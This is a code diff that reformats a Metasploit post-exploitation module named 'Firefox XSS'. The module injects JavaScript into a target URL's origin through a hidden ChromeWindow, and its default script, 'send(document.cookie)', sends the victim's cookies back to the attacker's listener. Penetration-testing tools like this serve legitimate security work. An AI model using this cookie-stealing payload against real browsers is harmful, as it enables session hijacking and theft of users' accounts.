@@ -9,19 +9,22 @@ class MetasploitModule < Msf::Post
   include Msf::Payload::Firefox
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Firefox XSS',
-      'Description'   => %q{
-        This module runs the provided SCRIPT as javascript in the
-        origin of the provided URL. It works by navigating to a hidden
-        ChromeWindow to the URL, then injecting the SCRIPT with Function().
-        The callback "send(result)" is used to send data back to the listener.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev' ],
-      'Platform'      => [ 'firefox' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Firefox XSS',
+        'Description' => %q{
+          This module runs the provided SCRIPT as javascript in the
+          origin of the provided URL. It works by navigating to a hidden
+          ChromeWindow to the URL, then injecting the SCRIPT with Function().
+          The callback "send(result)" is used to send data back to the listener.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'joev' ],
+        'Platform' => [ 'firefox' ]
+      )
+    )
 
     register_options([
       OptString.new('SCRIPT', [true, "The javascript command to run", 'send(document.cookie)']),
@@ -55,7 +58,7 @@ class MetasploitModule < Msf::Post
 
         hiddenWindow.location = 'about:blank';
         var src = (#{JSON.unparse({ :src => js })}).src;
-        var key = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
+        var key = "#{Rex::Text.rand_text_alphanumeric(8 + rand(12))}";
 
         hiddenWindow[key] = true;
         hiddenWindow.location = "#{datastore['URL']}";
